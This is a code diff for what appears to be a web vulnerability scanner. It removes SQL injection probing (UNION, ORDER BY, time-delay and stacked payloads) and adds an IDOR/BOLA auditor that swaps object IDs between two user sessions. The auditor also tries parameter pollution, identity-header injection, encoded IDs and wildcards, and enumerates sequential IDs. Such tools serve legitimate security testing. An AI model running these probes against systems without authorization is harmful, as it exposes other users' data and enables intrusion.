+    r"/([a-zA-Z][a-zA-Z0-9_-]*)/(\d{1,10}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?=/|$|\?)",
+    re.I,
+)
+
+
+def discover_surfaces(urls: list[str]) -> list[ObjectSurface]:
+    surfaces: list[ObjectSurface] = []
+    seen: set[tuple] = set()
+
+    for url in urls:
+        parsed = urllib.parse.urlparse(url)
+
+        # Path IDs
+        for m in REST_ID_PATH_RE.finditer(parsed.path + "/"):
+            resource = m.group(1)
+            ident = m.group(2)
+            key = ("path", resource, ident[:8])
+            if key in seen:
+                continue
+            seen.add(key)
+            surfaces.append(ObjectSurface(
+                endpoint=url, method="GET",
+                param_name="path_id", param_location="path",
+                id_type=_classify_id(ident),
+                sample_ids=[ident],
+            ))
+
+        # Query IDs
+        for k, vals in urllib.parse.parse_qs(parsed.query).items():
+            if k.lower() in ID_PARAM_NAMES and vals:
+                key = ("query", url.split("?")[0], k)
+                if key in seen:
+                    continue
+                seen.add(key)
+                surfaces.append(ObjectSurface(
+                    endpoint=url, method="GET",
+                    param_name=k, param_location="query",
+                    id_type=_classify_id(vals[0]),
+                    sample_ids=[vals[0]],
+                ))
+
+    return surfaces
+
+
+def discover_surfaces_from_pages(outdir: Path) -> list[ObjectSurface]:
+    pages_file = outdir / "site_pages.json"
+    if not pages_file.exists():
+        return []
+    try:
+        data = json.loads(pages_file.read_text())
+    except Exception:
+        return []
+    surfaces: list[ObjectSurface] = []
+    seen: set[tuple] = set()
+    for page in data.get("pages") or []:
+        page_url = page.get("url") or ""
+        for form in page.get("forms") or []:
+            if (form.get("method") or "").upper() != "POST":
+                continue
+            action = form.get("action") or page_url
+            for field_def in form.get("fields") or []:
+                fname = (field_def.get("name") or "").lower()
+                if fname not in ID_PARAM_NAMES:
+                    continue
+                key = (action, fname)
+                if key in seen:
+                    continue
+                seen.add(key)
+                surfaces.append(ObjectSurface(
+                    endpoint=action, method="POST",
+                    param_name=field_def.get("name"),
+                    param_location="body", id_type="unknown",
+                ))
+    return surfaces
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  URL BUILDING & REQUEST HELPERS
+# ═════════════════════════════════════════════════════════════════════════════
+
+def _replace_id_in_url(url: str, old: str, new: str) -> str:
+    if not old:
+        return url
+    pattern = re.compile(rf"(?<![A-Za-z0-9_-]){re.escape(old)}(?![A-Za-z0-9_-])")
+    return pattern.sub(new, url, count=1)
+
+
+def _build_test_url(surface: ObjectSurface, id_value: str) -> str:
+    if surface.param_location == "path":
+        if surface.sample_ids:
+            return _replace_id_in_url(surface.endpoint, surface.sample_ids[0], id_value)
+        return surface.endpoint
+    if surface.param_location == "query":
+        parsed = urllib.parse.urlparse(surface.endpoint)
+        params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+        new_params = [(k, id_value if k == surface.param_name else v) for k, v in params]
+        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_params)))
+    return surface.endpoint
+
+
+def _send(
+    session: Session, surface: ObjectSurface, id_value: str,
+    headers: dict, body_override: Optional[dict] = None,
+) -> Optional[requests.Response]:
+    if surface.param_location in ("query", "path"):
+        url = _build_test_url(surface, id_value)
+        return session.request(surface.method, url, headers=headers)
+    if surface.param_location == "body":
+        body = body_override if body_override is not None else {surface.param_name: id_value}
+        return session.request(surface.method, surface.endpoint, headers=headers, json=body)
+    return None
+
+
+def _harvest_ids(
+    session: Session, surface: ObjectSurface, headers: dict,
+    host_url: str, max_ids: int = 10,
+) -> list[str]:
+    harvested: set[str] = set()
+    resp = session.get(surface.endpoint, headers=headers)
+    if resp and resp.status_code < 400:
+        for kind in _extract_ids_from_text(_body_text(resp)).values():
+            harvested.update(kind[:max_ids])
+    listing_paths = [
+        "/api/users", "/api/accounts", "/api/orders", "/api/me",
+        "/users", "/accounts", "/api/v1/users",
+    ]
+    for path in listing_paths:
+        r = session.get(host_url.rstrip("/") + path, headers=headers)
+        if not r or r.status_code >= 400:
+            continue
+        for kind in _extract_ids_from_text(_body_text(r)).values():
+            harvested.update(kind[:max_ids])
+        if len(harvested) >= max_ids * 2:
             break
-        prefix += 1
-    prefix_ratio = prefix / min(len(a), len(b), 500)
-    return (len_ratio * 0.5) + (prefix_ratio * 0.5)
+    return [x for x in harvested if x][:max_ids]
 
 
-def test_boolean_blind(
-    session: requests.Session,
-    url: str, param: str, baseline: BaselineProfile,
-) -> list[SQLiFinding]:
+# ═════════════════════════════════════════════════════════════════════════════
+#  CORE DUAL-SESSION TEST
+# ═════════════════════════════════════════════════════════════════════════════
+
+def test_idor_dual(
+    session_a: Session, session_b: Session,
+    surface: ObjectSurface,
+    own_id: str, other_id: str,
+    headers_a: dict, headers_b: dict,
+) -> list[IDORFinding]:
     """
-    Paired TRUE/FALSE conditions. Requires:
-      • TRUE response resembles baseline
-      • FALSE response diverges from baseline
-      • The differential is repeatable with reversed ordering
-    """
-    findings: list[SQLiFinding] = []
+    The real test.
 
-    if not baseline.stable:
-        log.debug(f"    baseline unstable for {url}?{param} — skipping boolean")
+    Baseline requests:
+      A → own_id      (User A sees User A's data)
+      B → other_id    (User B sees User B's data)
+
+    Test:
+      A → other_id    (should be denied; if success, may be BOLA)
+      B → own_id      (reversal; confirms direction)
+
+    Shared-resource check:
+      If A → other_id AND B → own_id both succeed AND both match the
+      opposite baseline, the resource is shared (teams, orgs, public)
+      and this is NOT IDOR.
+    """
+    findings: list[IDORFinding] = []
+    now = _db_now()
+    target = surface.endpoint
+    target_host = urllib.parse.urlparse(target).hostname or ""
+
+    # ── Baselines
+    a_own = _send(session_a, surface, own_id, headers_a)
+    if a_own is None or a_own.status_code >= 500:
+        return findings
+    b_other = _send(session_b, surface, other_id, headers_b)
+    if b_other is None:
         return findings
 
-    for label, true_payload, false_payload, context in BOOLEAN_PAIRS:
-        # Pass 1: TRUE then FALSE
-        t_url = _inject_param(url, param, true_payload)
-        f_url = _inject_param(url, param, false_payload)
+    fp_a_own = _response_fingerprint(a_own)
+    fp_b_other = _response_fingerprint(b_other)
 
-        t_resp = _safe_request(session, t_url)
-        time.sleep(REQUEST_SLEEP)
-        f_resp = _safe_request(session, f_url)
-        time.sleep(REQUEST_SLEEP)
+    # ── Test: A requests B's object
+    a_other = _send(session_a, surface, other_id, headers_a)
+    if a_other is None:
+        return findings
 
-        if not t_resp or not f_resp:
-            continue
-
-        t_body = _body(t_resp)
-        f_body = _body(f_resp)
-
-        sim_t = _similarity(t_body, baseline.body)
-        sim_f = _similarity(f_body, baseline.body)
-
-        # Direction check: TRUE closer to baseline than FALSE
-        if not (sim_t > sim_f + 0.15):
-            continue
-
-        # Pass 2: reversed order
-        f_resp2 = _safe_request(session, f_url)
-        time.sleep(REQUEST_SLEEP)
-        t_resp2 = _safe_request(session, t_url)
-        time.sleep(REQUEST_SLEEP)
-
-        if not t_resp2 or not f_resp2:
-            continue
-
-        sim_t2 = _similarity(_body(t_resp2), baseline.body)
-        sim_f2 = _similarity(_body(f_resp2), baseline.body)
-
-        if not (sim_t2 > sim_f2 + 0.15):
-            continue
-
-        findings.append(SQLiFinding(
-            target=url,
-            param=param,
-            technique="boolean",
-            severity=SEV_HIGH,
-            confidence=80,
-            payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
-            evidence=(
-                f"Repeatable differential: TRUE≈baseline ({sim_t:.2f}, {sim_t2:.2f}), "
-                f"FALSE diverges ({sim_f:.2f}, {sim_f2:.2f})"
-            ),
-            repeatable=True,
-            details={
-                "context": context,
-                "true_similarity":  [round(sim_t, 3), round(sim_t2, 3)],
-                "false_similarity": [round(sim_f, 3), round(sim_f2, 3)],
-                "true_status":  t_resp.status_code,
-                "false_status": f_resp.status_code,
-            },
+    # Denial check — soft-200s don't count
+    if _has_denial_marker(a_other):
+        findings.append(IDORFinding(
+            target=target, vuln_type="idor_protected",
+            hypothesis="BOLA", technique="direct_swap",
+            param_name=surface.param_name,
+            param_location=surface.param_location,
+            id_type=surface.id_type,
+            own_id=own_id, other_id=other_id,
+            severity="INFO", confidence=30, confirmed=False,
+            evidence=f"User A requesting User B's object returned denial (HTTP {a_other.status_code})",
+            response_a=_body_text(a_own)[:400],
+            response_b=_body_text(a_other)[:400],
+            auth_enabled=True, first_seen=now,
+            details={"status_a_own": a_own.status_code, "status_a_other": a_other.status_code},
         ))
         return findings
 
+    if not (200 <= a_other.status_code < 300):
+        return findings
+
+    fp_a_other = _response_fingerprint(a_other)
+    sim_to_b_baseline = _similarity_by_fingerprint(fp_a_other, fp_b_other)
+    sim_to_a_baseline = _similarity_by_fingerprint(fp_a_other, fp_a_own)
+
+    ownership = extract_ownership_fields(a_other)
+    owns_other = _owns_id(ownership, other_id)
+    foreign = _foreign_data_present(ownership, own_id)
+
+    evidence_parts: list[str] = [f"User A → other_id returned HTTP {a_other.status_code}"]
+    confidence = CONF_LIKELY
+    confirmed = False
+    shared = False
+
+    # ── Primary confirmation: response identifies other_id as owner
+    if owns_other:
+        evidence_parts.append(f"Response identifies User B's ID at {owns_other}")
+        confidence = CONF_CONFIRMED
+        confirmed = True
+
+    # ── Secondary confirmation: response matches User B's baseline fingerprint
+    if sim_to_b_baseline >= 0.85 and fp_a_other != fp_a_own:
+        evidence_parts.append(f"Response matches User B's baseline ({sim_to_b_baseline:.2f})")
+        confidence = max(confidence, CONF_CONFIRMED)
+        confirmed = True
+
+    # ── Anti-false-positive: response matches User A's own baseline
+    if sim_to_a_baseline >= 0.9 and not owns_other:
+        # Server returned A's own data — parameter likely ignored
+        evidence_parts.append("Response matches User A's own baseline — parameter likely ignored")
+        findings.append(IDORFinding(
+            target=target, vuln_type="idor_param_ignored",
+            hypothesis="BOLA", technique="direct_swap",
+            param_name=surface.param_name,
+            param_location=surface.param_location,
+            id_type=surface.id_type,
+            own_id=own_id, other_id=other_id,
+            severity="INFO", confidence=30, confirmed=False,
+            evidence=" | ".join(evidence_parts),
+            response_a=_body_text(a_own)[:400],
+            response_b=_body_text(a_other)[:400],
+            auth_enabled=True, first_seen=now,
+        ))
+        return findings
+
+    # ── Reversal check (shared-resource detection)
+    if confidence >= CONF_LIKELY:
+        b_own = _send(session_b, surface, own_id, headers_b)
+        if b_own and 200 <= b_own.status_code < 300:
+            fp_b_own = _response_fingerprint(b_own)
+            sim_b_own_to_a = _similarity_by_fingerprint(fp_b_own, fp_a_own)
+            if sim_b_own_to_a >= 0.85:
+                evidence_parts.append("Reversal: User B sees User A's data — resource is shared")
+                shared = True
+                confirmed = False
+                confidence = CONF_CANDIDATE
+                severity = "LOW"
+            else:
+                evidence_parts.append(f"Reversal confirmed ({sim_b_own_to_a:.2f})")
+                confidence = CONF_CONFIRMED
+                confirmed = True
+
+    if confirmed:
+        severity = _score_severity(surface, confirmed=True)
+    elif shared:
+        severity = "LOW"
+    else:
+        severity = "MEDIUM"
+
+    findings.append(IDORFinding(
+        target=target, vuln_type="idor",
+        hypothesis="BOLA",
+        technique="direct_swap",
+        param_name=surface.param_name,
+        param_location=surface.param_location,
+        id_type=surface.id_type,
+        own_id=own_id, other_id=other_id,
+        severity=severity, confidence=confidence,
+        confirmed=confirmed, shared_resource=shared,
+        evidence=" | ".join(evidence_parts),
+        request_curl=_build_curl(surface.method,
+            _build_test_url(surface, other_id), headers_a),
+        response_a=_body_text(a_own)[:400],
+        response_b=_body_text(a_other)[:400],
+        ownership_leak=owns_other or foreign or "",
+        auth_enabled=True, first_seen=now,
+        details={
+            "status_a_own":     a_own.status_code,
+            "status_a_other":   a_other.status_code,
+            "status_b_other":   b_other.status_code,
+            "sim_to_b_baseline": round(sim_to_b_baseline, 3),
+            "sim_to_a_baseline": round(sim_to_a_baseline, 3),
+        },
+    ))
     return findings
 
 
+def _score_severity(surface: ObjectSurface, confirmed: bool) -> str:
+    if not confirmed:
+        return "LOW"
+    pname = (surface.param_name or "").lower()
+    # Login-flow params on confirmed IDOR → HIGH
+    if pname in ("next", "continue", "return", "return_url"):
+        return "HIGH"
+    # If confirmed but password reset / 2fa related → CRITICAL
+    if "reset" in pname or "otp" in pname or "2fa" in pname:
+        return "CRITICAL"
+    return "HIGH"
+
+
 # ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 4 — TIME-BASED BLIND
+#  BYPASS MATRIX
 # ═════════════════════════════════════════════════════════════════════════════
 
-def _time_probe(
-    session: requests.Session,
-    url: str, param: str, payload: str,
-    delay: int,
-) -> tuple[bool, float]:
+def test_bypasses(
+    session: Session, surface: ObjectSurface, own_id: str, other_id: str,
+    headers: dict,
+) -> list[IDORFinding]:
     """
-    Send a single time-based payload and return (timed_out, elapsed).
-    Timed out = the request exceeded baseline + 65% of the delay.
+    Try bypass techniques when direct swap returned a 4xx.
+
+    Techniques tried in order:
+      1. HTTP Parameter Pollution    ?id=A&id=B
+      2. Query array                 ?id[]=A&id[]=B
+      3. Method rotation             GET→POST etc.
+      4. Header injection            X-User-Id: other_id
+      5. Encoded variants            URL, base64, hex
+      6. Path traversal              ../, %2e%2e
+      7. Null/empty/wildcard         ?, *, %
     """
-    test_url = _inject_param(url, param, payload)
-    resp, elapsed = _request_with_timing(
-        session, test_url,
-        timeout=delay + 10,
-    )
-    time.sleep(REQUEST_SLEEP)
-    return resp is not None, elapsed
+    findings: list[IDORFinding] = []
+    now = _db_now()
+    target = surface.endpoint
+    target_host = urllib.parse.urlparse(target).hostname or ""
 
+    def _try(test_url: str, curl: str, technique: str, probe_resp: Optional[requests.Response]):
+        if not probe_resp or _has_denial_marker(probe_resp):
+            return
+        if not (200 <= probe_resp.status_code < 300):
+            return
+        ownership = extract_ownership_fields(probe_resp)
+        foreign = _foreign_data_present(ownership, own_id)
+        owns_other = _owns_id(ownership, other_id)
+        if not (foreign or owns_other):
+            return
+        findings.append(IDORFinding(
+            target=target, vuln_type="idor",
+            hypothesis="BOLA", technique=technique,
+            param_name=surface.param_name,
+            param_location=surface.param_location,
+            id_type=surface.id_type,
+            own_id=own_id, other_id=other_id,
+            severity="HIGH", confidence=CONF_LIKELY,
+            confirmed=False,       # bypasses are likely, not confirmed
+            evidence=f"{technique} returned 200 with foreign ownership data",
+            request_curl=curl,
+            response_b=_body_text(probe_resp)[:400],
+            ownership_leak=owns_other or foreign or "",
+            auth_enabled=True, first_seen=now,
+        ))
 
-def test_time_based(
-    session: requests.Session,
-    url: str, param: str, baseline: BaselineProfile,
-    dbms: str = "",
-) -> list[SQLiFinding]:
-    """
-    Send DBMS-specific delay payloads, with a paired control payload that
-    has the same syntax but zero delay. A finding requires the delayed probe
-    to exceed the control by a stable margin across 2 of 3 passes.
-    """
-    findings: list[SQLiFinding] = []
+    # ── 1. HPP
+    if surface.param_location == "query":
+        parsed = urllib.parse.urlparse(surface.endpoint)
+        params = urllib.parse.parse_qsl(parsed.query)
+        polluted = params + [(surface.param_name, other_id)]
+        test_url = urllib.parse.urlunparse(
+            parsed._replace(query=urllib.parse.urlencode(polluted))
+        )
+        _try(test_url, _build_curl("GET", test_url, headers), "hpp",
+             session.get(test_url, headers=headers))
 
-    families = [dbms] if dbms and dbms in TIME_PAYLOADS else list(TIME_PAYLOADS.keys())
+    # ── 2. Array wrapping
+    if surface.param_location == "query":
+        parsed = urllib.parse.urlparse(surface.endpoint)
+        params = urllib.parse.parse_qsl(parsed.query)
+        polluted = params + [(f"{surface.param_name}[]", other_id)]
+        test_url = urllib.parse.urlunparse(
+            parsed._replace(query=urllib.parse.urlencode(polluted))
+        )
+        _try(test_url, _build_curl("GET", test_url, headers), "array_wrap",
+             session.get(test_url, headers=headers))
 
-    for family in families:
-        for label, template in TIME_PAYLOADS.get(family, []):
-            # Delayed payload
-            delayed_payload = template.format(d=TIME_DELAY_SECONDS) if "{d}" in template else template
-            # Control payload (same syntax, zero delay where possible)
-            control_payload = template.format(d=0) if "{d}" in template else template
+    # ── 3. Method rotation with body
+    for alt_method in METHOD_ROTATION:
+        if alt_method == surface.method:
+            continue
+        if surface.param_location in ("query", "path"):
+            test_url = _build_test_url(surface, other_id)
+            r = session.request(alt_method, test_url, headers=headers)
+            _try(test_url, _build_curl(alt_method, test_url, headers),
+                 f"method_{alt_method.lower()}", r)
+        elif surface.param_location == "body":
+            r = session.request(
+                alt_method, surface.endpoint, headers=headers,
+                json={surface.param_name: other_id},
+            )
+            _try(surface.endpoint,
+                 _build_curl(alt_method, surface.endpoint, headers,
+                              json_body={surface.param_name: other_id}),
+                 f"method_{alt_method.lower()}", r)
+        if findings:
+            return findings
 
-            timings: list[float] = []
-            control_times: list[float] = []
+    # ── 4. Header injection
+    for hdr in IDENTITY_HEADERS:
+        test_headers = dict(headers or {})
+        test_headers[hdr] = other_id
+        r = session.get(surface.endpoint, headers=test_headers)
+        _try(surface.endpoint,
+             _build_curl("GET", surface.endpoint, test_headers),
+             f"header_{hdr.lower()}", r)
+        if findings:
+            return findings
 
-            for _ in range(CONFIRM_ATTEMPTS):
-                _, elapsed = _time_probe(session, url, param, delayed_payload, TIME_DELAY_SECONDS)
-                timings.append(elapsed)
-                _, c_elapsed = _time_probe(session, url, param, control_payload, TIME_DELAY_SECONDS)
-                control_times.append(c_elapsed)
-
-            if not timings or not control_times:
+    # ── 5. Encoded variants
+    if surface.param_location in ("query", "path"):
+        for variant in _encode_variants(other_id):
+            if variant == other_id:
                 continue
+            test_url = _build_test_url(surface, variant)
+            r = session.get(test_url, headers=headers)
+            _try(test_url, _build_curl("GET", test_url, headers),
+                 f"encoded_{variant[:10]}", r)
+            if findings:
+                return findings
 
-            median_probe = statistics.median(timings)
-            median_control = statistics.median(control_times)
-            expected_threshold = baseline.median_time + (TIME_DELAY_SECONDS * TIME_TOLERANCE)
-
-            # Count how many probes exceeded the threshold
-            above = sum(1 for t in timings if t >= expected_threshold)
-            control_above = sum(1 for t in control_times if t >= expected_threshold)
-
-            if above >= CONFIRM_AGREEMENT and control_above == 0:
-                findings.append(SQLiFinding(
-                    target=url,
-                    param=param,
-                    technique="time",
-                    severity=SEV_CRITICAL,
-                    confidence=85,
-                    dbms=family,
-                    payload=delayed_payload,
-                    evidence=(
-                        f"Repeatable timing delay: probe median {median_probe:.2f}s "
-                        f"vs control {median_control:.2f}s "
-                        f"(baseline {baseline.median_time:.2f}s, threshold {expected_threshold:.2f}s)"
-                    ),
-                    repeatable=True,
-                    details={
-                        "probe_timings":   [round(t, 2) for t in timings],
-                        "control_timings": [round(t, 2) for t in control_times],
-                        "above_threshold": above,
-                        "control_above":   control_above,
-                        "delay_seconds":   TIME_DELAY_SECONDS,
-                    },
-                ))
+    # ── 6. Null/empty/wildcard
+    if surface.param_location == "query":
+        for wildcard in ("", "0", "*", "%", "null", "undefined"):
+            test_url = _build_test_url(surface, wildcard)
+            r = session.get(test_url, headers=headers)
+            _try(test_url, _build_curl("GET", test_url, headers),
+                 f"wildcard_{wildcard or 'empty'}", r)
+            if findings:
                 return findings
 
     return findings
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 5 — UNION-BASED
+#  ENUMERATION (opt-in)
 # ═════════════════════════════════════════════════════════════════════════════
 
-def test_union_based(
-    session: requests.Session,
-    url: str, param: str, baseline: BaselineProfile,
-) -> list[SQLiFinding]:
-    """
-    Enumerate the column count via ORDER BY, then place a unique marker in
-    each NULL position and check whether it reflects into the response.
-    """
-    findings: list[SQLiFinding] = []
-    requests_sent = 0
-    marker = "ARG" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
+def test_enumeration(
+    session: Session, surface: ObjectSurface, own_id: str, headers: dict,
+) -> list[IDORFinding]:
+    """Enumerate nearby sequential IDs. Only run when --enumerate is passed."""
+    findings: list[IDORFinding] = []
+    now = _db_now()
 
-    # ── Column count via ORDER BY ───────────────────────────────────────────
-    column_count = 0
-    for n in range(1, MAX_ORDER_BY_COLUMNS + 1):
-        if requests_sent >= MAX_UNION_REQUESTS:
-            break
-        payload = f" ORDER BY {n}-- -"
-        resp = _safe_request(session, _inject_param(url, param, payload))
-        requests_sent += 1
-        time.sleep(REQUEST_SLEEP)
-        if resp is None:
-            continue
-        body = _body(resp)
-        new_errors = _fingerprint_errors(body) - baseline.error_signatures
-        if new_errors:
-            column_count = n - 1
-            break
-
-    if column_count < 1:
+    base = _send(session, surface, own_id, headers)
+    if not base or not (200 <= base.status_code < 300):
         return findings
 
-    # ── UNION SELECT with NULLs + marker ────────────────────────────────────
-    for position in range(column_count):
-        if requests_sent >= MAX_UNION_REQUESTS:
-            break
-        cols = ["NULL"] * column_count
-        cols[position] = f"'{marker}'"
-        payload = " UNION SELECT " + ",".join(cols) + "-- -"
-        resp = _safe_request(session, _inject_param(url, param, payload))
-        requests_sent += 1
-        time.sleep(REQUEST_SLEEP)
-        if resp is None:
+    fp_base = _response_fingerprint(base)
+
+    for test_id in _nearby_ids(own_id):
+        r = _send(session, surface, test_id, headers)
+        if not r or not (200 <= r.status_code < 300) or _has_denial_marker(r):
             continue
-
-        body = _body(resp)
-        if marker in body:
-            findings.append(SQLiFinding(
-                target=url,
-                param=param,
-                technique="union",
-                severity=SEV_CRITICAL,
-                confidence=95,
-                payload=payload,
-                evidence=f"UNION marker reflected in column {position + 1} of {column_count}",
-                repeatable=True,
-                details={
-                    "column_count":   column_count,
-                    "reflected_column": position + 1,
-                    "marker":         marker,
-                    "body_snippet":   body[:400],
-                },
-            ))
-            return findings
-
+        fp = _response_fingerprint(r)
+        if _similarity_by_fingerprint(fp, fp_base) >= 0.9:
+            continue
+        ownership = extract_ownership_fields(r)
+        foreign = _foreign_data_present(ownership, own_id)
+        if not foreign:
+            continue
+        findings.append(IDORFinding(
+            target=surface.endpoint, vuln_type="idor_enumeration",
+            hypothesis="BOLA", technique="sequential_enum",
+            param_name=surface.param_name,
+            param_location=surface.param_location,
+            id_type=surface.id_type,
+            own_id=own_id, other_id=test_id,
+            severity="MEDIUM", confidence=55, confirmed=False,
+            evidence=f"Enumerated ID {test_id} returned 200 with foreign data: {foreign}",
+            request_curl=_build_curl(surface.method,
+                _build_test_url(surface, test_id), headers),
+            response_a=_body_text(base)[:400],
+            response_b=_body_text(r)[:400],
+            ownership_leak=foreign,
+            auth_enabled=True, first_seen=now,
+        ))
+        return findings
     return findings
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  PHASE 6 — STACKED QUERIES
+#  SELF-SYNC
 # ═════════════════════════════════════════════════════════════════════════════
 
-def test_stacked(
-    session: requests.Session,
-    url: str, param: str, baseline: BaselineProfile,
-) -> list[SQLiFinding]:
-    """Probe for stacked query support. Never executes a destructive query."""
-    findings: list[SQLiFinding] = []
-
-    for payload in STACKED_PAYLOADS:
-        resp = _safe_request(session, _inject_param(url, param, payload))
-        time.sleep(REQUEST_SLEEP)
-        if resp is None:
-            continue
-        body = _body(resp)
-        new_errors = _fingerprint_errors(body) - baseline.error_signatures
-        if new_errors:
-            findings.append(SQLiFinding(
-                target=url,
-                param=param,
-                technique="stacked",
-                severity=SEV_HIGH,
-                confidence=70,
-                dbms=next(iter(new_errors)),
-                payload=payload,
-                evidence="Stacked query probe produced a DBMS error",
-                repeatable=False,
-                details={"body_snippet": body[:400]},
-            ))
-            return findings
-
-    return findings
-
-
-# ═════════════════════════════════════════════════════════════════════════════
-#  ORCHESTRATION
-# ═════════════════════════════════════════════════════════════════════════════
-
-def audit_endpoint(
-    session: requests.Session, url: str, param: str,
-    *,
-    test_union: bool = True,
-    test_stacked: bool = True,
-) -> EndpointResult:
-    """Run every SQLi oracle against one (url, param) pair."""
-    result = EndpointResult(url=url, param=param)
-
-    # ── Baseline ────────────────────────────────────────────────────────────
-    baseline = build_baseline(session, url, param)
-    result.baseline = baseline
-
-    if not baseline.length:
-        result.error = "baseline request failed"
-        return result
-
-    # ── Error-based ─────────────────────────────────────────────────────────
-    errors = test_error_based(session, url, param, baseline)
-    result.findings.extend(errors)
-
-    # If error-based confirmed, we have the DBMS
-    dbms = ""
-    if errors:
-        dbms = errors[0].dbms
-    else:
-        # Fallback: use any pre-existing error signature as a prior
-        if baseline.error_signatures:
-            dbms = next(iter(baseline.error_signatures))
-
-    result.dbms = dbms
-
-    # ── Boolean-based ───────────────────────────────────────────────────────
-    if not errors:
-        result.findings.extend(test_boolean_blind(session, url, param, baseline))
-
-    # ── Time-based ──────────────────────────────────────────────────────────
-    if not errors:
-        result.findings.extend(test_time_based(session, url, param, baseline, dbms))
-
-    # ── UNION ───────────────────────────────────────────────────────────────
-    if test_union and not any(f.technique == "union" for f in result.findings):
-        result.findings.extend(test_union_based(session, url, param, baseline))
-
-    # ── Stacked ─────────────────────────────────────────────────────────────
-    if test_stacked and not result.findings:
-        result.findings.extend(test_stacked(session, url, param, baseline))
-
-    return result
+def _self_sync(scan_id: int, findings: list[IDORFinding]) -> None:
+    if not findings:
+        return
+    if not DB_AVAILABLE or DB is None:
+        log.warning("  DB sync: db.py not available")
+        return
+    if not _cfg("SYNC_TO_DB", True):
+        log.info("  DB sync: SYNC_TO_DB is False")
+        return
+    if not _cfg("BRIDGE_ENABLED", False):
+        log.info("  DB sync: BRIDGE_ENABLED is False")
+        return
+    if not DB.available:
+        log.warning("  DB sync: bridge client not ready")
+        return
+    method = getattr(DB, "upsert_idor_findings", None)
+    if method is None:
+        log.warning(
+            "  DB sync: db.py is missing upsert_idor_findings() — "
+            "add the method to enable dedicated-table sync"
+        )
+        return
+    try:
+        payloads = [f.to_dict() for f in findings]
+        result = method(scan_id, payloads)
+        if result is None:
+            log.warning("  DB sync: bridge returned None")
+        else:
+            log.info(f"  DB sync: {result} IDOR finding(s) upserted (scan_id={scan_id})")
+    except Exception as e:
+        log.warning(f"  DB sync: exception — {e}")
 
 
 # ═════════════════════════════════════════════════════════════════════════════
 #  PUBLIC ENTRY POINT
 # ═════════════════════════════════════════════════════════════════════════════
 
-def run_sqli_scan(
-    urls_file: Path,
+def run_idor_audit(
+    live_urls_file: Path,
     outdir: Path,
     *,
-    test_union: bool = True,
-    test_stacked: bool = True,
-    max_endpoints: int = 500,
+    rate_limit: Optional[int] = None,
+    concurrency: Optional[int] = None,
     headers: Optional[dict] = None,
+    user_a_headers: Optional[dict] = None,
+    user_b_headers: Optional[dict] = None,
+    user_a_id: Optional[str] = None,
+    user_b_id: Optional[str] = None,
+    graphql_schema_file: Optional[Path] = None,
+    test_bypasses: bool = True,
+    enumerate: bool = False,
+    max_ids_per_surface: int = 3,
+    scan_id: Optional[int] = None,
 ) -> Path:
-    """
-    Run the SQLi audit against every parameterised URL in `urls_file`.
-
-    Returns the path to `sqli_findings.json`.
-    """
     start = time.monotonic()
 
-    urls = _load_urls(urls_file)
-    candidates = _extract_candidates(urls)
-    if len(candidates) > max_endpoints:
-        log.warning(f"  Capping at {max_endpoints} (url, param) pairs (had {len(candidates)})")
-        candidates = candidates[:max_endpoints]
+    settings = _idor_settings()
+    eff_rate = rate_limit if rate_limit is not None else settings["rate_limit"]
+    eff_conc = concurrency if concurrency is not None else settings["concurrency"]
+    eff_timeout = settings["timeout"]
 
+    urls = _load_urls(live_urls_file)
     outdir.mkdir(parents=True, exist_ok=True)
 
-    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
-    log.info(f"  Pairs  : {len(candidates)} (url, param) candidate(s)")
+    cfg_hdrs = _target_headers()
     if headers:
-        log.info("  Auth   : headers supplied")
+        for k, v in headers.items():
+            cfg_hdrs.setdefault(k, v)
+    auth_on = bool(cfg_hdrs or user_a_headers)
+
+    dual_session = bool(user_a_headers and user_b_headers)
+
+    log.info(f"  Input  : {len(urls)} URL(s) from {live_urls_file.name}")
+    log.info(f"  Config : rate={eff_rate}/s  concurrency={eff_conc}  timeout={eff_timeout}s")
+    log.info(f"  Auth   : {'yes' if auth_on else 'no'}")
+
+    if dual_session:
+        log.info("  Mode   : DUAL-SESSION (BOLA confirmed via cross-identity)")
+        log.info(f"           User A ID: {user_a_id or '(not set — harvest)'}")
+        log.info(f"           User B ID: {user_b_id or '(not set — harvest)'}")
+    elif user_a_headers:
+        log.info("  Mode   : ENUMERATION (single session — LIKELY findings)")
+    else:
+        log.info("  Mode   : SURFACE-ONLY (no credentials)")
     log.info("")
 
-    if not candidates:
-        log.warning("  No parameterised URLs — writing empty report")
-        return _write_empty_report(outdir, urls_file, start)
+    if not urls:
+        log.warning("  No URLs — writing empty report")
+        return _write_empty_report(outdir, live_urls_file, start)
 
-    session = requests.Session()
-    session.headers.update({"User-Agent": USER_AGENT})
-    if headers:
-        session.headers.update(headers)
-    session.verify = False
-
-    # ── Audit each pair ─────────────────────────────────────────────────────
-    results: list[EndpointResult] = []
-    for i, (url, param) in enumerate(candidates, 1):
-        log.info(f"  [{i:>3}/{len(candidates)}] {url[:70]}  param={param}")
-        try:
-            result = audit_endpoint(
-                session, url, param,
-                test_union=test_union,
-                test_stacked=test_stacked,
-            )
-            results.append(result)
-            if result.findings:
-                top = result.findings[0]
-                log.info(f"           → {top.severity} ({top.technique}, {top.confidence}%)")
-            elif result.dbms:
-                log.info(f"           → dbms={result.dbms} (no confirmed finding)")
-        except Exception as e:
-            log.warning(f"           → error: {e}")
-            results.append(EndpointResult(url=url, param=param, error=str(e)))
-
-    # ── Flatten findings ────────────────────────────────────────────────────
-    all_findings: list[SQLiFinding] = []
-    for r in results:
-        all_findings.extend(r.findings)
-
-    # ── Deduplicate by (url, param, technique) ──────────────────────────────
+    # ── Surface discovery
+    surfaces = discover_surfaces(urls)
+    surfaces.extend(discover_surfaces_from_pages(outdir))
     seen: set[tuple] = set()
-    deduped: list[SQLiFinding] = []
-    for f in all_findings:
-        key = (f.target, f.param, f.technique)
+    unique: list[ObjectSurface] = []
+    for s in surfaces:
+        key = (s.endpoint, s.method, s.param_name, s.param_location)
         if key not in seen:
             seen.add(key)
-            deduped.append(f)
+            unique.append(s)
